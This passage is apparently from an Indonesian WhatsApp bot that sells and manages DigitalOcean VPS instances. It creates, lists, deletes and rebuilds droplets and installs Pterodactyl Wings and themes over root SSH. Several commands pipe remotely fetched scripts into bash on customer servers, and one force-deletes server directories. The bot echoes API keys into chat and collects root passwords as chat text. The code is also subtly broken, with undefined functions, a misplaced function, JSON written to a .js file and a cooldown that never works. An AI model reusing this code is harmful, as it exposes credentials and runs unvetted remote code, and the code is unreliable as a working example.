 •ᴄᴘᴜ ᴜꜱᴀɢᴇ ᴠᴘꜱ ᴍᴇɴʏᴇɴᴛᴜʜ 𝟣𝟢𝟢%

⚠️𝐀𝐍𝐉𝐔𝐑𝐀𝐍 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍
  •ᴍᴇɴɢɢᴀɴᴛɪ ᴋᴀᴛᴀ ꜱᴀɴᴅɪ ᴠᴘꜱ ᴍᴇɴᴊᴀᴅɪ ᴋᴀᴛᴀ ꜱᴀɴᴅɪ ʏᴀɴɢ ᴜɴɪᴋ 
  •ʜɪɴᴅᴀʀɪ ɪɴꜱᴛᴀʟʟ ꜱᴏꜰᴛᴡᴀʀᴇ / ꜱᴄʀɪᴘᴛ ꜱᴇᴍʙᴀʀᴀɴɢ 
  •ʜɪɴᴅᴀʀɪ ʙᴇʙᴀɴ ʙᴇʀʟᴇʙɪʜ ᴘᴀᴅᴀ ᴠᴘꜱ
  •ᴊᴀɴɢᴀɴ ꜱᴀᴍᴘᴀɪ ᴠᴘꜱ ᴛᴇʀᴋᴇɴᴀ ʜᴀᴄᴋ
  •ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴀɢɪᴋᴀɴ ᴅᴀᴛᴀ ᴠᴘꜱ ᴋᴇ ᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇɴᴀʟ

🔒ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀᴋ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ɢᴀʀᴀɴꜱɪ. ᴜɴᴛᴜᴋ ᴋᴇᴀᴍᴀɴᴀɴ ᴅᴀɴ ᴋᴇɴʏᴀᴍᴀɴᴀɴ ʙɪꜱᴀ ᴍᴇɴɢɪᴋᴜᴛɪ ᴀɴᴊᴜʀᴀɴ ᴘᴇᴍᴀᴋᴀɪᴀɴ
============================

🏪 𝗧.𝗢.𝗦 𝗧𝗢𝗞𝗢
• Web toko mati karena DDoS tapi VPS masih aktif → Garansi TETAP AKTIF 
• VPS mati karena DDoS → Garansi HANGUS  
• VPS aktif tapi tidak bisa login → Kemungkinan besar CPU 100% → Garansi HANGUS
• Simpan data VPS Anda! Kehilangan data = Garansi hangus 
• Jadilah pembeli yang bijak, gunakan VPS sesuai aturan  

============================

📛 𝗞𝗘𝗧𝗘𝗡𝗧𝗨𝗔𝗡 𝗝𝗜𝗞𝗔 𝗔𝗞𝗨𝗡 𝗗𝗢 𝗧𝗘𝗥𝗞𝗘𝗡𝗔 𝗦𝗨𝗦𝗣𝗘𝗡𝗗
• GARANSI BERLAKU 2 HARI SETELAH PEMBAYARAN
• TEPATNYA DI HARI KE 2 GARANSI SUDAH TIDAK BERLAKU
• WAJIB DI PAHAMI!!!
============================

📝 𝗦𝗬𝗔𝗥𝗔𝗧 𝗖𝗟𝗔𝗜𝗠 𝗚𝗔𝗥𝗔𝗡𝗦𝗜
1. Bawa bukti transfer
2. Sertakan screenshot chat saat pembelian  
3. Ingat tanggal pembelian 
4. Lampirkan data VPS (IP / user / dll)

𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗪𝘆𝗶𝗶𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹
t.me/wyii_lyoraaa
𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗪𝘆𝗶𝗶𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹
t.me/testirekber_wyi

🚫𝗞𝗘𝗦𝗘𝗣𝗔𝗞𝗔𝗧𝗔𝗡 𝗬𝗔𝗡𝗚 𝗗𝗜 𝗕𝗘𝗥𝗜𝗞𝗔𝗡‼️
𝗥𝗘𝗣𝗟𝗔𝗖𝗘 𝗩𝗣𝗦 𝗠𝗔𝗫 𝟭𝘅
𝗥𝗘𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗔𝗡𝗘𝗟 𝗠𝗔𝗫 𝟭𝘅
𝗥𝗘𝗕𝗨𝗜𝗟𝗗 𝗩𝗣𝗦 𝗠𝗔𝗫 𝟮𝘅
𝗥𝗘𝗕𝗢𝗢𝗧 𝗩𝗣𝗦 𝗠𝗔𝗫 𝟮𝘅

「 𝑻𝒆𝒓𝒊𝒎𝒂 𝒌𝒂𝒔𝒊𝒉 𝒔𝒆𝒃𝒆𝒔𝒂𝒓-𝒃𝒆𝒔𝒂𝒓𝒏𝒚𝒂 𝒂𝒕𝒂𝒔 𝒌𝒖𝒏𝒋𝒖𝒏𝒈𝒂𝒏 & 𝒑𝒆𝒎𝒃𝒆𝒍𝒊𝒂𝒏 𝑽𝑷𝑺 𝒉𝒂𝒓𝒊 𝒊𝒏𝒊 ✨
💻 𝑲𝒆𝒑𝒖𝒂𝒔𝒂𝒂𝒏 𝒂𝒏𝒅𝒂 𝒂𝒅𝒂𝒍𝒂𝒉 𝒑𝒓𝒊𝒐𝒓𝒊𝒕𝒂𝒔 𝒌𝒂𝒎𝒊, 𝒅𝒂𝒏 𝒔𝒆𝒎𝒐𝒈𝒂 𝒍𝒂𝒚𝒂𝒏𝒂𝒏 𝒌𝒂𝒎𝒊 𝒅𝒂𝒑𝒂𝒕 𝒎𝒆𝒏𝒆𝒎𝒂𝒏𝒊 𝒌𝒆𝒃𝒖𝒕𝒖𝒉𝒂𝒏 𝒅𝒊𝒈𝒊𝒕𝒂𝒍 𝒂𝒏𝒅𝒂 🚀
🙏 𝑻𝒆𝒓𝒊𝒎𝒂 𝒌𝒂𝒔𝒊𝒉 𝒕𝒆𝒍𝒂𝒉 𝒎𝒆𝒎𝒑𝒆𝒓𝒄𝒂𝒚𝒂𝒌𝒂𝒏 𝒌𝒆𝒑𝒆𝒓𝒍𝒖𝒂𝒏 𝒂𝒏𝒅𝒂 𝒌𝒆𝒑𝒂𝒅𝒂 𝒌𝒂𝒎𝒊, 𝒅𝒊𝒕𝒖𝒏𝒈𝒈𝒖 𝒕𝒓𝒂𝒏𝒔𝒂𝒌𝒔𝒊 𝒃𝒆𝒓𝒊𝒌𝒖𝒕𝒏𝒚𝒂 ✨

@wyiiofficial

============================`;


            let messageText = `✅ *VPS BERHASIL DIBUAT!* 🎉\n============================\n`;
            messageText += `🆔 *ID:* ${dropletId}\n`;
            messageText += `👤 *Username:* root\n`;
            messageText += `🌐 *IP VPS:* ${ipVPS}\n`;
            messageText += `🔐 *Password:* ${password}\n`;
            messageText += `💽 *Hostname:* ${hostname}\n`;
            messageText += `📀 *OS:* ${os}\n`;
            messageText += `📍 *Region:* ${region.toUpperCase()}\n`;
            messageText += `💾 *Size:* ${images}\n`;
            messageText += `⏰ *Created:* ${tanggal(Date.now())}\n`;
            messageText += `${aturannya}`;

            await syah.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        return syahreply(`⚠️ Terjadi kesalahan saat membuat VPS:\n${err.message || err}`);
    }
}
break;  
case "tambahdo": {
  if (!isCreator) return syahreply(mess.owner)
  if (!text || !text.includes("|")) return syahreply(`*Format Salah!*\n\nContoh: .tambahdo akun2|dop_v1_xxxxxx`)

  let [slot, apiKey] = text.split("|")
  slot = slot.trim()
  apiKey = apiKey.trim()

  if (!slot.startsWith("akun")) return syahreply(`❌ Gunakan nama akun seperti: akun1, akun2, akun3, dst`)
  if (!apiKey.startsWith("dop_v1_")) return syahreply(`❌ API Key harus diawali dengan dop_v1_`)

  const fs = require("fs")
  const path = "./setting.js"

  // Cek dan load data lama
  let settings = {}
  if (fs.existsSync(path)) {
    try {
      settings = JSON.parse(fs.readFileSync(path))
    } catch (e) {
      console.error("❌ Gagal membaca setting.json:", e)
      return syahreply("❌ Gagal membaca setting.json. Format rusak?")
    }
  }

  if (!settings.apiDigitalOcean) settings.apiDigitalOcean = {}
  settings.apiDigitalOcean[slot] = apiKey

  try {
    fs.writeFileSync(path, JSON.stringify(settings, null, 2))
    global.apiDigitalOcean = settings.apiDigitalOcean // update global runtime
    syahreply(`✅ API Key berhasil ditambahkan!\n\n📦 Slot: ${slot}\n🔑 Key: ${apiKey}`)
  } catch (e) {
    console.error("❌ Gagal menyimpan:", e)
    syahreply("❌ Gagal menyimpan ke setting.json")
  }
}
break;
case "sisadroplet": {
    if (!isCreator && !isPremium) return syahreply(mess.premium);

    let messages = [];
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const [accountRes, dropletsRes] = await Promise.all([
                fetch("https://api.digitalocean.com/v2/account", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                }),
                fetch("https://api.digitalocean.com/v2/droplets", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                })
            ]);

            if (!accountRes.ok || !dropletsRes.ok) {
                errors.push(
                    `⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Gagal mendapatkan data`
                );
                continue;
            }

            const accountData = await accountRes.json();
            const dropletsData = await dropletsRes.json();

            const dropletLimit = accountData.account.droplet_limit;
            const totalDroplets = dropletsData.droplets.length;
            const remainingDroplets = dropletLimit - totalDroplets;
            const email = accountData.account.email;
            const status = accountData.account.status; // status akun

            messages.push(
                `⊡══════════════════════⊡\n` +
                `🌟 *Akun DigitalOcean V${version}*\n` +
                `📧 *Email:* ${email}\n` +
                `🔑 *API Key:* ${apiKey}\n` +
                `📊 *Status Akun:* ${status === "active" ? "✅ Aktif" : "⚠️ " + status}\n` +
                `📌 *Batas Maksimum Droplet:* ${dropletLimit}\n` +
                `🚀 *Total Droplet Terpakai:* ${totalDroplets}\n` +
                `✅ *Sisa Droplet Tersedia:* ${remainingDroplets}\n`
            );
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(
                `⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Terjadi kesalahan`
            );
        }
    }

    if (messages.length === 0) {
        return syahreply("❌ Tidak ada akun DigitalOcean yang valid atau API Key tidak dikonfigurasi.");
    }

    let finalMessage = `🌐 *SISA DROPLET DIGITALOCEAN* 🌐\n\n` + messages.join("\n");
    if (errors.length > 0) {
        finalMessage += `\n\n${errors.join("\n")}`;
    }

    await syahreply(finalMessage);
}
break;        
        
case "listdroplet": {
    if (!isCreator) return syahreply(mess.owner);

    try {
        let message = "🌐 *List Droplet DigitalOcean*\n\n";
        let totalVps = 0;
        let akunDitemukan = false;

        for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
            let version = key.replace("akun", "");

            if (!apiKey || apiKey.length < 64) {
                message += `⊡══════════════════════⊡\n`;
                message += `🌟 *Akun DigitalOcean V${version}*\n   ❌ API Key tidak valid!\n\n`;
                continue;
            }

            akunDitemukan = true;
            message += `⊡══════════════════════⊡\n`;
            message += `🌟 *Akun DigitalOcean V${version}*\n`;

            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                message += `   ⚠️ Gagal mengambil data droplet!\n\n`;
                continue;
            }

            let data = await response.json();
            let droplets = data.droplets || [];
            totalVps += droplets.length;

            if (droplets.length === 0) {
                message += `   🚫 Tidak ada droplet yang tersedia!\n\n`;
            } else {
                droplets.forEach((droplet, index) => {
                    let ipv4 = droplet.networks.v4.find(net => net.type === "public")?.ip_address || "Tidak ada IP!";
                    message += `   🔹 *Droplet ${index + 1}*\n`;
                    message += `      ➤ *ID:* ${droplet.id}\n`;
                    message += `      ➤ *Hostname:* ${droplet.name}\n`;
                    message += `      ➤ *Username:* Root\n`;
                    message += `      ➤ *IP:* ${ipv4}\n`;
                    message += `      ➤ *RAM:* ${droplet.memory} MB\n`;
                    message += `      ➤ *CPU:* ${droplet.vcpus} vCPU\n`;
                    message += `      ➤ *OS:* ${droplet.image.distribution}\n`;
                    message += `      ➤ *Storage:* ${droplet.disk} GB\n`;
                    message += `      ➤ *Status:* ${droplet.status === "active" ? "✅ Aktif" : "❌ Nonaktif"}\n\n`;
                });
            }
        }

        if (!akunDitemukan) {
            message = "⚠️ Tidak ada API DigitalOcean yang dikonfigurasi dengan benar!";
        } else {
            message = `🌐 *List Droplet DigitalOcean*\n\nTotal VPS: ${totalVps}\n\n` + message;
            message += `⊡══════════════════════⊡\n`;
        }

        await syah.sendMessage(m.chat, { text: message }, { quoted: m });

    } catch (err) {
        console.error("Error fetching droplets:", err);
        await syahreply("❌ Terjadi kesalahan saat mengambil data droplet.");
    }
}
break;
case "installwings": {
  if (!text) return syahreply("❌ Format salah!\nContoh:\n.installwings 123.45.67.89|password|panel.domain.com|node.domain.com");

  const [ip, password, domainpanel, domainnode] = text.split("|");
  if (!ip || !password || !domainpanel || !domainnode) {
    return syahreply("❌ Format salah!\nGunakan: ip|password|domain_panel|domain_node");
  }

  const conn = new Client();
  const random = Math.floor(1000 + Math.random() * 9000);
  const emailAcak = `kennyhost${random}@gmail.com`;
  const userDB = `kennydb${Math.floor(1000 + Math.random() * 9000)}`;
  const passDB = `kennypw${Math.floor(1000 + Math.random() * 9000)}`;

  syahreply(`📡 Menghubungkan ke VPS *${ip}*...\n🚀 Memulai proses install Wings...\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailAcak}\n🗃️ DB User: ${userDB}\n🔐 DB Pass: ${passDB}`);

  conn.on("ready", () => {
    conn.exec("bash <(curl -s https://pterodactyl-installer.se)", (err, stream) => {
      if (err) {
        conn.end();
        return syahreply("❌ Gagal menjalankan installer di VPS.");
      }

      stream.on("close", (code) => {
        conn.end();
        if (code === 0) {
          syahreply(`✅ *Wings berhasil diinstall di VPS ${ip}*\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailAcak}\n🗃️ DB: ${userDB} | ${passDB}`);
        } else {
          syahreply(`⚠️ Installer selesai dengan kode ${code}. Beberapa mungkin gagal. Cek manual VPS.`);
        }
      });

      stream.on("data", (data) => {
        const out = data.toString();
        console.log("INSTALL >>", out);

        if (out.includes("Input 0-6")) stream.write("1\n");
        if (out.includes("(y/N)")) stream.write("y\n");
        if (out.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
        if (out.includes("Database host username")) stream.write(`${userDB}\n`);
        if (out.includes("Database host password")) stream.write(`${passDB}\n`);
        if (out.includes("Set the FQDN to use for Let's Encrypt")) stream.write(`${domainnode}\n`);
        if (out.includes("Enter email address")) stream.write(`${emailAcak}\n`);
      });

      stream.stderr.on("data", (data) => {
        console.error("STDERR:", data.toString());
      });
    });
  }).on("error", (err) => {
    syahreply(`❌ Gagal konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: password,
    readyTimeout: 20000
  });
}
break;
case "selfgc": {
  if (!isCreator) return syahreply(mess.owner);
  if (!isGroup) return syahreply("❌ Hanya dapat digunakan dalam grup.");

  const fs = require("fs");
  const file = "./library/database/selfGroups.json";
  const groupId = m.chat;

  // Cek dan buat file jika belum ada
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify([]));

  let selfGroups = JSON.parse(fs.readFileSync(file));

  if (selfGroups.includes(groupId)) {
    selfGroups = selfGroups.filter(g => g !== groupId);
    fs.writeFileSync(file, JSON.stringify(selfGroups, null, 2));
    syahreply("✅ Grup ini telah *dikeluarkan* dari mode self bot.");
  } else {
    selfGroups.push(groupId);
    fs.writeFileSync(file, JSON.stringify(selfGroups, null, 2));
    syahreply("🛡️ Grup ini telah *ditambahkan* ke daftar mode self bot.");
  }
}
break;
case "uninstallwings": {
  if (!isCreator && !isPremium) return syahreply(mess.premium);
  if (!text) return syahreply("❌ Format salah!\nContoh:\n.uninstallwings 123.45.67.89|passwordvps");

  let [ip, password] = text.split("|");
  if (!ip || !password) return syahreply("❌ Format tidak valid. Gunakan: ip|password");

  const conn = new Client();
  syahreply(`🛠 Menghubungkan ke VPS *${ip}*...\nSedang proses uninstall Wings + reset port...`);

  conn.on('ready', () => {
    const script = `
# Hentikan dan hapus Wings
systemctl stop wings
systemctl disable wings
rm -f /etc/systemd/system/wings.service
rm -f /usr/local/bin/wings
rm -rf /etc/pterodactyl
rm -rf /var/lib/pterodactyl
`;

    conn.exec(script, (err, stream) => {
      if (err) {
        conn.end();
        return syahreply("❌ Gagal mengeksekusi perintah di VPS.");
      }

      stream.on('close', (code) => {
        conn.end();
        if (code === 0) {
          syahreply(`✅ *Wings berhasil dihapus dari VPS ${ip}*\n🧹 Port 8080 & 2022 juga dibersihkan.`);
        } else {
          syahreply(`⚠️ Selesai dengan kode ${code}. Sebagian mungkin gagal. Periksa manual.`);
        }
      }).on('data', (data) => {
        console.log("STDOUT:", data.toString());
      }).stderr.on('data', (data) => {
        console.error("STDERR:", data.toString());
      });
    });
  }).on('error', (err) => {
    syahreply(`❌ Tidak bisa konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: password,
    readyTimeout: 15000
  });
}
break;        
case "installtemabg": {
  const userId = m.sender;
  const cooldownInstall = new Map();

  // CEK COOLDOWN 60 detik
  if (cooldownInstall.has(userId)) {
    const lastUsed = cooldownInstall.get(userId);
    const now = Date.now();
    const diff = Math.ceil((now - lastUsed) / 1000);
    if (diff < 60) return syahreply(`⏳ Tunggu *${60 - diff} detik* sebelum menggunakan perintah ini lagi.`);
  }

  cooldownInstall.set(userId, Date.now());

  // CEK FORMAT
  if (!text) return syahreply("❌ Format salah!\nContoh:\n.installtemabg 123.45.67.89|password|https://example.com/gambar.jpg");

  const [ip, password, linkfoto] = text.split("|");
  if (!ip || !password || !linkfoto || !/^https?:\/\/\S+\.(jpg|jpeg|png|webp)$/i.test(linkfoto)) {
    return syahreply("❌ Format salah!\nGunakan format:\nip|password|linkfoto (format .jpg/.png/.webp)");
  }

  // KIRIM PESAN PEMBUKA
  await syahreply(`🟡 *Proses Install Tema*\n\n🖥️ IP VPS: *${ip}*\n🔐 Password: *Tersembunyi*\n🖼️ Background: ${linkfoto}\n\n⏳ Mohon tunggu proses sedang berjalan...`);

  const conn = new Client();

  conn.on("ready", () => {
    conn.exec("bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)", (err, stream) => {
      if (err) {
        conn.end();
        return syahreply("❌ Gagal menjalankan installer tema di VPS.");
      }

      stream.on("close", (code) => {
        conn.end();
        if (code === 0) {
          syahreply(`✅ *Background Panel berhasil diubah di VPS ${ip}*\n🖼️ Background baru:\n${linkfoto}`);
        } else {
          syahreply(`⚠️ Installer selesai dengan kode ${code}. Sebagian mungkin gagal, silakan cek manual.`);
        }
      });

      stream.on("data", (data) => {
        const output = data.toString().toLowerCase();
        console.log("INSTALL BG OUTPUT >>", output);

        stream.write("7\n");
        stream.write(`${linkfoto}\n`);
      });

      stream.stderr.on("data", (data) => {
        console.error("STDERR INSTALL BG:", data.toString());
      });
    });
  }).on("error", () => {
    syahreply(`❌ Tidak bisa terhubung ke VPS *${ip}*.\nPeriksa kembali IP dan password VPS.`);
  }).connect({
    host: ip,
    port: 22,
    username: "root",
    password: password,
    readyTimeout: 20000
  });
}
break;
case "uninstalltemabg": {
  const userId = m.sender;
  const cooldownUninstall = new Map();

  // COOLDOWN 60 DETIK PER USER
  if (cooldownUninstall.has(userId)) {
    const lastUsed = cooldownUninstall.get(userId);
    const now = Date.now();
    const diff = Math.ceil((now - lastUsed) / 1000);
    if (diff < 60) return syahreply(`⏳ Tunggu *${60 - diff} detik* sebelum menggunakan perintah ini lagi.`);
  }
  cooldownUninstall.set(userId, Date.now());

  // CEK FORMAT
  if (!text) return syahreply("❌ Format salah!\nContoh:\n.uninstalltemabg 123.45.67.89|password");
  const [ip, password] = text.split("|");
  if (!ip || !password) return syahreply("❌ Format salah. Gunakan: ip|password");

  // PESAN PEMBUKA
  await syahreply(`🗑️ *Proses Uninstall Tema Custom*\n\n🖥️ IP VPS: *${ip}*\n🔐 Password: *Tersembunyi*\n🚨 Menghapus background tema (opsi 8)...\n\n⏳ Mohon tunggu proses...`);

  const conn = new Client();

  conn.on("ready", () => {
    conn.exec("bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)", (err, stream) => {
      if (err) {
        conn.end();
        return syahreply("❌ Gagal menjalankan uninstall tema.");
      }

      stream.on("close", (code) => {
        conn.end();
        if (code === 0) {
          syahreply(`✅ *Background tema berhasil dihapus dari VPS ${ip}*\n📄 Panel kembali ke tampilan default.`);
        } else {
          syahreply(`⚠️ Uninstall selesai dengan kode ${code}. Sebagian mungkin gagal, silakan cek manual.`);
        }
      });

      stream.on("data", (data) => {
        const output = data.toString().toLowerCase();
        console.log("UNINSTALL BG >>", output);

        stream.write("8\n");
      });

      stream.stderr.on("data", (data) => {
        console.error("STDERR UNINSTALL BG:", data.toString());
      });
    });
  }).on("error", () => {
    syahreply(`❌ Tidak bisa terhubung ke VPS *${ip}*.\nPastikan IP dan password benar.`);
  }).connect({
    host: ip,
    port: 22,
    username: "root",
    password: password,
    readyTimeout: 20000
  });
}
break;

case "deldroplet": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const dropletList = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!dropletList.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            const data = await dropletList.json();
            const droplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (droplet) {
                found = true;
                const deleteResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "DELETE",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (deleteResponse.ok) {
                    return syahreply(`✅ Droplet dengan ID *${dropletId}* berhasil dihapus!\n🌟 *Akun DigitalOcean V${version}*`);
                } else {
                    const errorData = await deleteResponse.json();
                    errors.push(`❌ Akun DigitalOcean V${version}: ${errorData.message || "Kesalahan tidak diketahui"}`);
                }
            }
        } catch (error) {
            console.error(`Error di akun V${version}:`, error);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return syahreply(errorMessage);
    }
}
break;
case "cekstatusvps": {
    if (!isCreator && !isPremium) return syahreply(mess.premium);
    if (!text) return syahreply(example("IDDroplet"));

    const dropletId = text.trim();
    let found = false;
    let errors = [];

    const safeJson = async (res) => {
        const text = await res.text();
        try {
            return JSON.parse(text);
        } catch (e) {
            throw new Error(`Respon bukan JSON (kode ${res.status}): ${text.slice(0, 80)}...`);
        }
    };

    for (const [key, apiKeyRaw] of Object.entries(global.apiDigitalOcean)) {
        const version = key.replace("akun", "");
        const apiKey = apiKeyRaw.startsWith("Bearer ") ? apiKeyRaw : `Bearer ${apiKeyRaw}`;

        if (!apiKey || apiKey.length < 64) {
            errors.push(`⚠️ Akun V${version}: API key tidak valid`);
            continue;
        }

        try {
            const resDroplets = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: apiKey }
            });

            if (!resDroplets.ok) {
                const errMsg = await resDroplets.text();
                errors.push(`❌ Akun V${version}: ${errMsg.slice(0, 80)}...`);
                continue;
            }

            const dataDroplets = await safeJson(resDroplets);
            const droplet = dataDroplets.droplets.find(d => d.id.toString() === dropletId);
            if (!droplet) continue;

            found = true;

            const dropletName = droplet.name;
            const ip = droplet.networks.v4[0]?.ip_address || "-";
            const status = droplet.status.toUpperCase();

            const now = new Date();
            const start = new Date(now.getTime() - 5 * 60 * 1000).toISOString();
            const end = now.toISOString();

            // Monitoring fetch
            const monitoringUrls = {
                cpu: `https://api.digitalocean.com/v2/monitoring/metrics/droplet/cpu?host_id=${dropletId}&start=${start}&end=${end}`,
                ram: `https://api.digitalocean.com/v2/monitoring/metrics/droplet/memory_utilization_percent?host_id=${dropletId}&start=${start}&end=${end}`,
                disk: `https://api.digitalocean.com/v2/monitoring/metrics/droplet/disk_utilization_percent?host_id=${dropletId}&start=${start}&end=${end}`
            };

            let cpu = "N/A", ram = "N/A", disk = "N/A";

            const fetchMetric = async (url) => {
                try {
                    const res = await fetch(url, { headers: { Authorization: apiKey } });
                    if (!res.ok) return null;
                    const data = await safeJson(res);
                    return getAvg(data?.data?.result?.[0]?.values);
                } catch (e) {
                    return null;
                }
            };

            cpu = await fetchMetric(monitoringUrls.cpu) ?? "N/A";
            ram = await fetchMetric(monitoringUrls.ram) ?? "N/A";
            disk = await fetchMetric(monitoringUrls.disk) ?? "N/A";

            return syahreply(
                `📡 *Status VPS DigitalOcean*\n\n` +
                `🖥️ *Nama:* ${dropletName}\n` +
                `🆔 *ID:* ${dropletId}\n` +
                `🌐 *IP:* ${ip}\n` +
                `🔌 *Status:* ${status}\n\n` +
                `📊 *Resource Usage (5 menit)*\n` +
                `• CPU  : ${cpu}%\n` +
                `• RAM  : ${ram}%\n` +
                `• Disk : ${disk}%\n\n` +
                `🌟 Akun DigitalOcean V${version}`
            );

        } catch (err) {
            console.error(`❌ Error akun V${version}:`, err.message);
            errors.push(`❌ Akun V${version}: ${err.message}`);
        }
    }

    if (!found) {
        let errorMessage = `❌ Droplet dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) errorMessage += `\n${errors.join("\n")}`;
        return syahreply(errorMessage);
    }

    break;
}

// Fungsi bantu rata-rata metric
function averageMetric(values) {
    if (!Array.isArray(values) || values.length === 0) return "0.0";
    const valid = values.filter(([_, v]) => v !== null).map(([_, v]) => v);
    if (valid.length === 0) return "0.0";
    const sum = valid.reduce((a, b) => a + b, 0);
    return (sum / valid.length).toFixed(1);
}
case "rebuild": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text) return syahreply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let rebuildResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {

                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "rebuild", image: "ubuntu-22-04-x64" })
                });

                let rebuildData = await rebuildResponse.json();

                if (!rebuildResponse.ok) {
                    return kennreply(`❌ Gagal melakukan rebuild VPS:\n🌟 *Akun DigitalOcean V${version}*\n${rebuildData.message || "Terjadi kesalahan"}`);
                }

                await syahreply(`🔄 *Rebuild VPS sedang diproses...*\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n⏳ *Status:* ${rebuildData.action.status}`);

                await sleep(60000);

                let vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (!vpsInfo.ok) {
                    return kennreply("❌ Gagal mendapatkan informasi VPS setelah rebuild!");
                }

                let vpsData = await vpsInfo.json();
                let droplet = vpsData.droplet;
                let ipAddress = droplet.networks.v4.find(net => net.type === "public")?.ip_address || "Tidak ada IP!";
                
                let textvps = `✅ *VPS BERHASIL DI REBUILD*\n\n📡 *IP VPS:* ${ipAddress}\n💾 *Sistem Image:* ${droplet.image.slug}`;
                return await Gadzz.sendMessage(m.chat, { text: textvps }, { quoted: m });
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return kennreply(errorMessage);
    }
}
break;     
case "restartvps": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let restartResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "reboot" })
                });

                let restartData = await restartResponse.json();

                if (!restartResponse.ok) {
